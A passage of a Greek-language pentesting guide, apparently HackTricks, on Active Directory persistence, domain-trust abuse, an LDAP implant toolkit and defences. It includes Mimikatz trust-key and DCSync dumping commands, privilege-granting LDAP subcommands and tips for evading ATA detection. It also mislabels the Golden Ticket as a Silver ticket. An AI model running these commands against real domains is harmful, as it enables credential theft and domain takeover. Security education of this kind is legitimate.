Μια **Golden Ticket attack** περιλαμβάνει έναν επιτιθέμενο που αποκτά πρόσβαση στο **NTLM hash του krbtgt account** σε ένα Active Directory (AD) περιβάλλον. Αυτός ο λογαριασμός είναι ιδιαίτερος επειδή χρησιμοποιείται για την υπογραφή όλων των **Ticket Granting Tickets (TGTs)**, τα οποία είναι απαραίτητα για την authentication εντός του AD δικτύου.

Μόλις ο επιτιθέμενος αποκτήσει αυτό το hash, μπορεί να δημιουργήσει **TGTs** για οποιονδήποτε λογαριασμό επιθυμεί (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Αυτά μοιάζουν με golden tickets πλαστογραφημένα με τρόπο που **παρακάμπτει κοινά μηχανισμούς ανίχνευσης για golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

Το **να έχεις certificates ενός account ή να μπορείς να τα αιτηθείς** είναι πολύ καλός τρόπος για να μπορέσεις να παραμείνεις στο λογαριασμό του χρήστη (ακόμα και αν αλλάξει το password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Η χρήση certificates είναι επίσης δυνατή για persistence με υψηλά προνόμια μέσα στο domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Το αντικείμενο **AdminSDHolder** στο Active Directory διασφαλίζει την ασφάλεια των **privileged groups** (όπως Domain Admins και Enterprise Admins) εφαρμόζοντας ένα τυποποιημένο **Access Control List (ACL)** σε αυτές τις ομάδες για να αποτρέψει μη εξουσιοδοτημένες αλλαγές. Ωστόσο, αυτή η λειτουργία μπορεί να εκμεταλλευτεί· αν ένας επιτιθέμενος τροποποιήσει το ACL του AdminSDHolder για να δώσει πλήρη πρόσβαση σε έναν απλό χρήστη, αυτός ο χρήστης αποκτά εκτεταμένο έλεγχο σε όλες τις privileged ομάδες. Αυτό το μέτρο ασφάλειας, που προορίζεται για προστασία, μπορεί έτσι να αντιστραφεί, επιτρέποντας αδικαιολόγητη πρόσβαση αν δεν παρακολουθείται στενά.

[**Περισσότερες πληροφορίες για το AdminDSHolder Group εδώ.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Σε κάθε **Domain Controller (DC)** υπάρχει ένας **local administrator** λογαριασμός. Αποκτώντας admin rights σε τέτοια μηχανή, το local Administrator hash μπορεί να εξαχθεί χρησιμοποιώντας **mimikatz**. Κατόπιν απαιτείται μια τροποποίηση στο registry για να **ενεργοποιηθεί η χρήση αυτού του password**, επιτρέποντας απομακρυσμένη πρόσβαση στον local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Μπορείτε να **δώσετε** μερικά **ειδικά προνόμια** σε έναν **χρήστη** πάνω σε συγκεκριμένα domain objects που θα επιτρέψουν στον χρήστη να **ανεβάσει προνόμια στο μέλλον**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Οι **security descriptors** χρησιμοποιούνται για να **αποθηκεύσουν** τα **permissions** που έχει ένα **αντικείμενο** πάνω σε ένα **αντικείμενο**. Αν μπορείτε απλώς να κάνετε μια **μικρή αλλαγή** στο **security descriptor** ενός αντικειμένου, μπορείτε να αποκτήσετε πολύ ενδιαφέροντα προνόμια πάνω σε εκείνο το αντικείμενο χωρίς να χρειάζεται να είστε μέλος μιας privileged ομάδας.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Τροποποίηση της **LSASS** στη μνήμη για να καθιερωθεί ένα **universal password**, δίνοντας πρόσβαση σε όλους τους domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Μάθετε τι είναι ένα SSP (Security Support Provider) εδώ.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Μπορείτε να δημιουργήσετε το **δικό σας SSP** για να **παγιδεύετε** σε **clear text** τα **credentials** που χρησιμοποιούνται για πρόσβαση στη μηχανή.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Καταχωρεί έναν **νέο Domain Controller** στο AD και τον χρησιμοποιεί για να **pushάρει attributes** (SIDHistory, SPNs...) σε συγκεκριμένα αντικείμενα **χωρίς** να αφήνει logs σχετικά με τις **τροποποιήσεις**. Χρειάζεστε DA προνόμια και να βρίσκεστε μέσα στο **root domain**.\
Σημειώστε ότι αν χρησιμοποιήσετε λάθος δεδομένα, θα εμφανιστούν αρκετά άσχημα logs.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Προηγουμένως συζητήσαμε πώς να ανεβάσουμε προνόμια αν έχετε **αρκετή permission για να διαβάσετε LAPS passwords**. Ωστόσο, αυτά τα passwords μπορούν επίσης να χρησιμοποιηθούν για **διατήρηση persistence**.\
Δείτε:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Η Microsoft θεωρεί το **Forest** ως το όριο ασφάλειας. Αυτό σημαίνει ότι **ο συμβιβασμός ενός μεμονωμένου domain μπορεί ενδεχομένως να οδηγήσει στον συμβιβασμό ολόκληρου του Forest**.

### Basic Information

Ένα [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) είναι ένας μηχανισμός ασφάλειας που επιτρέπει σε έναν χρήστη από ένα **domain** να προσπελάσει πόρους σε άλλο **domain**. Ουσιαστικά δημιουργεί μια σύνδεση μεταξύ των authentication συστημάτων των δύο domains, επιτρέποντας στις διαδικασίες πιστοποίησης να ρέουν απρόσκοπτα. Όταν τα domains δημιουργούν μια trust σχέση, ανταλλάσσουν και διατηρούν συγκεκριμένα **keys** στους **Domain Controllers (DCs)** τους, τα οποία είναι κρίσιμα για την ακεραιότητα της trust.

Σε ένα τυπικό σενάριο, αν ένας χρήστης σκοπεύει να προσπελάσει μια υπηρεσία σε ένα **trusted domain**, πρέπει πρώτα να ζητήσει ένα ειδικό ticket γνωστό ως **inter-realm TGT** από τον δικό του domain DC. Αυτό το TGT κρυπτογραφείται με ένα κοινό **key** που και τα δύο domains έχουν συμφωνήσει. Ο χρήστης τότε παρουσιάζει αυτό το TGT στον **DC του trusted domain** για να λάβει ένα service ticket (**TGS**). Μετά την επιτυχή επαλήθευση του inter-realm TGT από τον DC του trusted domain, αυτός εκδίδει ένα TGS, δίνοντας στον χρήστη πρόσβαση στην υπηρεσία.

**Βήματα**:

1. Ένας **client computer** στο **Domain 1** ξεκινά τη διαδικασία χρησιμοποιώντας το **NTLM hash** του για να ζητήσει ένα **Ticket Granting Ticket (TGT)** από τον **Domain Controller (DC1)**.
2. Ο DC1 εκδίδει ένα νέο TGT αν ο client αυθεντικοποιηθεί επιτυχώς.
3. Ο client στη συνέχεια ζητά ένα **inter-realm TGT** από τον DC1, που είναι απαραίτητο για πρόσβαση σε πόρους στο **Domain 2**.
4. Το inter-realm TGT κρυπτογραφείται με ένα **trust key** που μοιράζονται ο DC1 και ο DC2 ως μέρος της αμφίδρομης domain trust.
5. Ο client παίρνει το inter-realm TGT στον **Domain Controller (DC2)** του Domain 2.
6. Ο DC2 επαληθεύει το inter-realm TGT χρησιμοποιώντας το κοινό trust key και, αν είναι έγκυρο, εκδίδει ένα **Ticket Granting Service (TGS)** για τον server στο Domain 2 που ο client θέλει να προσπελάσει.
7. Τέλος, ο client παρουσιάζει αυτό το TGS στον server, το οποίο είναι κρυπτογραφημένο με το hash του server account, για να αποκτήσει πρόσβαση στην υπηρεσία στο Domain 2.

### Different trusts

Είναι σημαντικό να παρατηρήσετε ότι **μια trust μπορεί να είναι 1-way ή 2-way**. Στην 2-way επιλογή, και τα δύο domains θα εμπιστεύονται το ένα το άλλο, αλλά στην **1-way** σχέση εμπιστοσύνης ένα από τα domains θα είναι το **trusted** και το άλλο το **trusting** domain. Στην τελευταία περίπτωση, **θα μπορείτε να προσπελάσετε πόρους μόνο μέσα στο trusting domain από το trusted domain**.

Αν το Domain A εμπιστεύεται το Domain B, το A είναι το trusting domain και το B το trusted. Επιπλέον, στο **Domain A**, αυτό θα είναι ένα **Outbound trust**· και στο **Domain B**, αυτό θα είναι ένα **Inbound trust**.

**Διαφορετικές trusting σχέσεις**

- **Parent-Child Trusts**: Αυτό είναι μια κοινή ρύθμιση εντός του ίδιου forest, όπου ένα child domain έχει αυτόματα μια two-way transitive trust με το parent domain. Ουσιαστικά αυτό σημαίνει ότι αιτήματα authentication μπορούν να ρέουν απρόσκοπτα μεταξύ parent και child.
- **Cross-link Trusts**: Αναφερόμενες ως "shortcut trusts," αυτές δημιουργούνται μεταξύ child domains για να επιταχύνουν τις διαδικασίες referral. Σε πολύπλοκα forests, οι παραπομπές authentication συνήθως πρέπει να ταξιδέψουν μέχρι τη ρίζα του forest και μετά κάτω στο target domain. Δημιουργώντας cross-links, το ταξίδι συντομεύει, κάτι που είναι ιδιαίτερα χρήσιμο σε γεωγραφικά διασκορπισμένα περιβάλλοντα.
- **External Trusts**: Αυτές δημιουργούνται μεταξύ διαφορετικών, μη σχετιζόμενων domains και είναι μη-transitive από τη φύση τους. Σύμφωνα με την [τεκμηρίωση της Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), οι external trusts είναι χρήσιμες για πρόσβαση σε πόρους σε ένα domain έξω από το τρέχον forest που δεν συνδέεται με forest trust. Η ασφάλεια ενισχύεται μέσω SID filtering με external trusts.
- **Tree-root Trusts**: Αυτές οι trusts δημιουργούνται αυτόματα μεταξύ του forest root domain και ενός νεοπροστιθέμενου tree root. Αν και δεν συναντώνται συχνά, οι tree-root trusts είναι σημαντικές για την προσθήκη νέων domain trees σε ένα forest, επιτρέποντάς τους να διατηρήσουν ένα μοναδικό domain όνομα και διασφαλίζοντας two-way transitivity. Περισσότερες πληροφορίες στο [Microsoft guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Αυτός ο τύπος trust είναι μια two-way transitive trust μεταξύ δύο forest root domains, επίσης εφαρμόζοντας SID filtering για ενίσχυση των μέτρων ασφάλειας.
- **MIT Trusts**: Αυτές οι trusts δημιουργούνται με μη-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. Οι MIT trusts είναι πιο εξειδικευμένες και απευθύνονται σε περιβάλλοντα που απαιτούν ενσωμάτωση με Kerberos-based συστήματα εκτός του Windows οικοσυστήματος.

#### Άλλες διαφορές στις **trusting σχέσεις**

- Μια σχέση trust μπορεί επίσης να είναι **transitive** (A trust B, B trust C, τότε A trust C) ή **non-transitive**.
- Μια σχέση trust μπορεί να ρυθμιστεί ως **bidirectional trust** (και τα δύο εμπιστεύονται το άλλο) ή ως **one-way trust** (μόνο ένα εμπιστεύεται το άλλο).

### Attack Path

1. **Αναγνωρίστε** τις σχέσεις εμπιστοσύνης
2. Ελέγξτε αν κάποιος **security principal** (user/group/computer) έχει **πρόσβαση** σε πόρους του **άλλου domain**, ίσως μέσω ACE entries ή μέσω συμμετοχής σε groups του άλλου domain. Ψάξτε για **σχέσεις μεταξύ domains** (η trust δημιουργήθηκε πιθανώς γι' αυτό).
1. kerberoast σε αυτή την περίπτωση θα μπορούσε να είναι μια άλλη επιλογή.
3. **Συμβιβάστε** τους **λογαριασμούς** που μπορούν να **pivot** μεταξύ domains.

Οι επιτιθέμενοι μπορούν να αποκτήσουν πρόσβαση σε πόρους σε άλλο domain μέσω τριών κύριων μηχανισμών:

- **Local Group Membership**: Principals μπορεί να προστεθούν σε τοπικές ομάδες σε μηχανήματα, όπως η ομάδα “Administrators” σε έναν server, δίνοντάς τους σημαντικό έλεγχο πάνω σε εκείνη τη μηχανή.
- **Foreign Domain Group Membership**: Principals μπορούν επίσης να είναι μέλη ομάδων μέσα στο ξένο domain. Ωστόσο, η αποτελεσματικότητα αυτής της μεθόδου εξαρτάται από τη φύση της trust και το scope της ομάδας.
- **Access Control Lists (ACLs)**: Principals μπορεί να αναφέρονται σε ένα **ACL**, ιδιαίτερα ως οντότητες σε **ACEs** μέσα σε ένα **DACL**, παρέχοντάς τους πρόσβαση σε συγκεκριμένους πόρους. Για όσους θέλουν να εμβαθύνουν στις μηχανικές των ACLs, DACLs και ACEs, το whitepaper με τίτλο “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” είναι ανεκτίμητο.

### Find external users/groups with permissions

Μπορείτε να ελέγξετε **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** για να βρείτε foreign security principals στο domain. Αυτοί θα είναι χρήστες/ομάδες από **ένα εξωτερικό domain/forest**.

Μπορείτε να το ελέγξετε αυτό στο **Bloodhound** ή χρησιμοποιώντας powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Άλλοι τρόποι για την καταγραφή των domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Υπάρχουν **2 αξιόπιστα κλειδιά**, ένα για _Child --> Parent_ και ένα άλλο για _Parent_ --> _Child_.\
> Μπορείτε να δείτε ποιο χρησιμοποιείται από το τρέχον domain με:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Αναβαθμίστε σε Enterprise admin στο child/parent domain εκμεταλλευόμενοι το trust με SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Εκμετάλλευση εγγράψιμου Configuration NC

Είναι κρίσιμο να κατανοήσετε πώς μπορεί να εκμεταλλευτεί το Configuration Naming Context (NC). Το Configuration NC λειτουργεί ως κεντρική αποθήκη για δεδομένα διαμόρφωσης σε ένα forest σε περιβάλλοντα Active Directory (AD). Αυτά τα δεδομένα αναπαράγονται σε κάθε Domain Controller (DC) του forest, και οι εγγράψιμοι DC διατηρούν μια εγγράψιμη αντιγραφή του Configuration NC. Για να το εκμεταλλευτείτε, χρειάζεστε **SYSTEM προνόμια σε έναν DC**, κατά προτίμηση σε child DC.

**Σύνδεση GPO στο root DC site**

Το container Sites του Configuration NC περιλαμβάνει πληροφορίες για τα sites όλων των υπολογιστών που έχουν ενταχθεί στο domain μέσα στο AD forest. Λειτουργώντας με **SYSTEM προνόμια** σε οποιονδήποτε DC, οι επιτιθέμενοι μπορούν να συνδέσουν GPOs στα root DC sites. Αυτή η ενέργεια ενδεχομένως συμβιβάζει το root domain μέσω χειραγώγησης των πολιτικών που εφαρμόζονται σε αυτά τα sites.

Για λεπτομερείς πληροφορίες, μπορείτε να εξερευνήσετε την έρευνα στο [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Συμβιβασμός οποιουδήποτε gMSA στο forest**

Ένας επιθετικός μπορεί να στοχεύσει privileged gMSAs εντός του domain. Το KDS Root key, απαραίτητο για τον υπολογισμό των κωδικών των gMSAs, αποθηκεύεται μέσα στο Configuration NC. Με **SYSTEM προνόμια** σε οποιονδήποτε DC, είναι δυνατή η πρόσβαση στο KDS Root key και ο υπολογισμός των κωδικών για οποιοδήποτε gMSA σε όλο το forest.

Αναλυτική ανάλυση και βήμα‑βήμα οδηγίες υπάρχουν σε:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Συμπληρωματική επίθεση delegated MSA (BadSuccessor – κατάχρηση migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Επιπλέον εξωτερική έρευνα: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Επίθεση αλλαγής Schema**

Αυτή η μέθοδος απαιτεί υπομονή, περιμένοντας τη δημιουργία νέων privileged AD objects. Με **SYSTEM προνόμια**, ένας επιτιθέμενος μπορεί να τροποποιήσει το AD Schema ώστε να δώσει σε οποιονδήποτε χρήστη πλήρη έλεγχο σε όλες τις κλάσεις. Αυτό μπορεί να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση και έλεγχο πάνω σε νεοδημιουργούμενα AD objects.

Περισσότερη ανάγνωση είναι διαθέσιμη στο [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Η ευπάθεια ADCS ESC5 στοχεύει τον έλεγχο αντικειμένων Public Key Infrastructure (PKI) για να δημιουργήσει ένα certificate template που επιτρέπει authentication ως οποιοσδήποτε χρήστης μέσα στο forest. Δεδομένου ότι τα PKI objects βρίσκονται στο Configuration NC, ο συμβιβασμός ενός εγγράψιμου child DC επιτρέπει την εκτέλεση ESC5 attacks.

Περισσότερες λεπτομέρειες μπορείτε να διαβάσετε στο [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Σε σενάρια χωρίς ADCS, ο επιτιθέμενος μπορεί να εγκαταστήσει τα απαραίτητα components, όπως συζητείται στο [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Σε αυτό το σενάριο **ένα εξωτερικό domain εμπιστεύεται το domain σας**, παρέχοντάς σας **απροσδιόριστα δικαιώματα** επ' αυτού. Θα χρειαστεί να βρείτε **ποιοι principals του domain σας έχουν ποια πρόσβαση στο εξωτερικό domain** και στη συνέχεια να προσπαθήσετε να τα εκμεταλλευτείτε:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Σε αυτό το σενάριο **το domain σας** **εμπιστεύεται** κάποια **προνόμια** σε principal από **διεφορετικό domain**.

Ωστόσο, όταν ένα **domain εμπιστεύεται** από το trusting domain, το trusted domain **δημιουργεί έναν χρήστη** με ένα **προβλέψιμο όνομα** που χρησιμοποιεί ως **συνθηματικό το trusted password**. Αυτό σημαίνει ότι είναι δυνατό να **πρόσβαση σε χρήστη από το trusting domain για να εισέλθεις στο trusted domain** για να το αναγνωρίσεις και να προσπαθήσεις να κλιμακώσεις περισσότερα προνόμια:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Ένας άλλος τρόπος να kompromise το trusted domain είναι να βρεις ένα [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) που έχει δημιουργηθεί στην **αντίθετη κατεύθυνση** του domain trust (το οποίο δεν είναι πολύ συνηθισμένο).

Ένας άλλος τρόπος να compromize το trusted domain είναι να περιμένεις σε μια μηχανή όπου ένας **χρήστης από το trusted domain μπορεί να συνδεθεί** μέσω **RDP**. Τότε, ο επιτιθέμενος μπορεί να εισάγει κώδικα στη διαδικασία της RDP session και να **προσπελάσει το αρχικό domain του θύματος** από εκεί.\
Επιπλέον, αν ο **θύμας έχει προσαρτήσει τον σκληρό του δίσκο**, από τη διαδικασία της **RDP session** ο επιτιθέμενος μπορεί να αποθηκεύσει **backdoors** στο **φάκελο εκκίνησης του σκληρού δίσκου**. Αυτή η τεχνική ονομάζεται **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Μετριασμός κατάχρησης domain trust

### **SID Filtering:**

- Ο κίνδυνος επιθέσεων που εκμεταλλεύονται το SID history attribute σε forest trusts μετριάζεται από το SID Filtering, το οποίο είναι ενεργοποιημένο εξ ορισμού σε όλους τους inter-forest trusts. Αυτό βασίζεται στην υπόθεση ότι τα intra-forest trusts είναι ασφαλή, θεωρώντας το forest — αντί για το domain — ως το όριο ασφάλειας σύμφωνα με τη θέση της Microsoft.
- Ωστόσο, υπάρχει ένα πρόβλημα: το SID filtering μπορεί να διαταράξει εφαρμογές και πρόσβαση χρηστών, οδηγώντας στην περιστασιακή απενεργοποίησή του.

### **Selective Authentication:**

- Για inter-forest trusts, η χρήση του Selective Authentication εξασφαλίζει ότι οι χρήστες από τα δύο forests δεν αυθεντικοποιούνται αυτόματα. Αντίθετα, απαιτούνται ρητά δικαιώματα για να έχουν οι χρήστες πρόσβαση σε domains και servers εντός του trusting domain ή forest.
- Είναι σημαντικό να σημειωθεί ότι αυτά τα μέτρα δεν προστατεύουν από την εκμετάλλευση της writable Configuration Naming Context (NC) ή από επιθέσεις στον trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) επανυλοποιεί τα bloodyAD-style LDAP primitives ως x64 Beacon Object Files που τρέχουν εξ ολοκλήρου μέσα σε ένα on-host implant (π.χ., Adaptix C2). Οι χειριστές μεταγλωττίζουν το πακέτο με `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, φορτώνουν `ldap.axs`, και στη συνέχεια καλούν `ldap <subcommand>` από το beacon. Όλη η κίνηση χρησιμοποιεί το τρέχον context ασφάλειας του logon πάνω σε LDAP (389) με signing/sealing ή LDAPS (636) με auto certificate trust, οπότε δεν απαιτούνται socks proxies ή artifacts στο δίσκο.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` επιλύουν short names/OU paths σε πλήρη DNs και κάνουν dump τα αντίστοιχα αντικείμενα.
- `get-object`, `get-attribute`, and `get-domaininfo` αντλούν αυθαίρετα attributes (συμπεριλαμβανομένων των security descriptors) καθώς και τα forest/domain metadata από το `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` αποκαλύπτουν roasting candidates, ρυθμίσεις delegation, και υπάρχοντες [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors απευθείας από το LDAP.
- `get-acl` and `get-writable --detailed` αναλύουν την DACL για να καταγράψουν trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), και inheritance, παρέχοντας άμεσα στόχους για ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Οι Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) επιτρέπουν στον χειριστή να τοποθετήσει νέους principals ή machine accounts όπου υπάρχουν OU rights. Οι `add-groupmember`, `set-password`, `add-attribute` και `set-attribute` αναλαμβάνουν απευθείας targets μόλις εντοπιστούν write-property rights.
- Εντολές εστιασμένες στα ACL όπως `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` και `add-dcsync` μεταφράζουν τα WriteDACL/WriteOwner σε οποιοδήποτε AD αντικείμενο σε password resets, έλεγχο membership ομάδων ή προνόμια DCSync replication χωρίς να αφήνουν PowerShell/ADSI artifacts. Τα αντίστοιχα `remove-*` καθαρίζουν τα injected ACEs.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` κάνουν άμεσα έναν παραβιασμένο χρήστη Kerberoastable· η `add-asreproastable` (UAC toggle) τον σηματοδοτεί για AS-REP roasting χωρίς αλλαγή του password.
- Τα delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) ξαναγράφουν τα `msDS-AllowedToDelegateTo`, UAC flags ή `msDS-AllowedToActOnBehalfOfOtherIdentity` από το beacon, επιτρέποντας constrained/unconstrained/RBCD attack paths και εξαλείφοντας την ανάγκη για remote PowerShell ή RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- Η `add-sidhistory` εγχέει privileged SIDs στο SID history ενός ελεγχόμενου principal (see [SID-History Injection](sid-history-injection.md)), παρέχοντας κρυφή κληρονομικότητα πρόσβασης πλήρως μέσω LDAP/LDAPS.
- Η `move-object` αλλάζει το DN/OU των computers ή users, επιτρέποντας σε έναν attacker να μεταφέρει assets σε OUs όπου υπάρχουν ήδη delegated rights πριν εκμεταλλευτεί `set-password`, `add-groupmember` ή `add-spn`.
- Εντολές στενά στοχευμένης αφαίρεσης (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, κ.λπ.) επιτρέπουν γρήγορο rollback μετά τη συλλογή credentials ή persistence από τον χειριστή, ελαχιστοποιώντας την τηλεμετρία.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Μερικές Γενικές Αμυντικές Μέθοδοι

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Αμυντικά Μέτρα για την Προστασία Διαπιστευτηρίων**

- **Domain Admins Restrictions**: Συνιστάται οι Domain Admins να επιτρέπεται να συνδέονται μόνο σε Domain Controllers, αποφεύγοντας τη χρήση τους σε άλλους υπολογιστές.
- **Service Account Privileges**: Οι υπηρεσίες δεν πρέπει να εκτελούνται με Domain Admin (DA) προνόμια για τη διατήρηση της ασφάλειας.
- **Temporal Privilege Limitation**: Για εργασίες που απαιτούν DA προνόμια, η διάρκεια τους πρέπει να περιορίζεται. Αυτό μπορεί να επιτευχθεί με: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Ελέγξτε τα Audit Event IDs 2889/3074/3075 και στη συνέχεια επιβάλετε LDAP signing μαζί με LDAPS channel binding σε DCs/clients για να μπλοκάρετε προσπάθειες LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Υλοποίηση τεχνικών Deception**

- Η υλοποίηση deception περιλαμβάνει την τοποθέτηση παγίδων, όπως decoy users ή computers, με χαρακτηριστικά όπως passwords που δεν λήγουν ή είναι επισημασμένα ως Trusted for Delegation. Μια λεπτομερής προσέγγιση περιλαμβάνει τη δημιουργία χρηστών με συγκεκριμένα δικαιώματα ή την προσθήκη τους σε ομάδες υψηλών προνομίων.
- Ένα πρακτικό παράδειγμα περιλαμβάνει τη χρήση εργαλείων όπως: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Περισσότερα για την ανάπτυξη deception techniques μπορείτε να βρείτε στο [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Εντοπισμός Deception**

- **Για αντικείμενα χρήστη**: Ενδείξεις ύποπτης συμπεριφοράς περιλαμβάνουν μη τυπικό ObjectSID, σπάνιες συνδέσεις (infrequent logons), ημερομηνίες δημιουργίας και χαμηλούς μετρητές αποτυχημένων κωδικών.
- **Γενικές Ενδείξεις**: Η σύγκριση attributes πιθανών decoy αντικειμένων με εκείνα των πραγματικών μπορεί να αποκαλύψει ασυνέπειες. Εργαλεία όπως [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) μπορούν να βοηθήσουν στον εντοπισμό τέτοιων deception.

### **Παράκαμψη Συστημάτων Ανίχνευσης**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Αποφυγή session enumeration σε Domain Controllers για να προληφθεί η ανίχνευση από ATA.
- **Ticket Impersonation**: Η χρήση **aes** keys για δημιουργία ticket βοηθά στην απόκρυψη, αποφεύγοντας την υποβάθμιση σε NTLM.
- **DCSync Attacks**: Συνιστάται η εκτέλεση από μη-Domain Controller για να αποφευχθεί η ανίχνευση από ATA, καθώς η άμεση εκτέλεση από Domain Controller θα προκαλέσει ειδοποιήσεις.

## Αναφορές

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
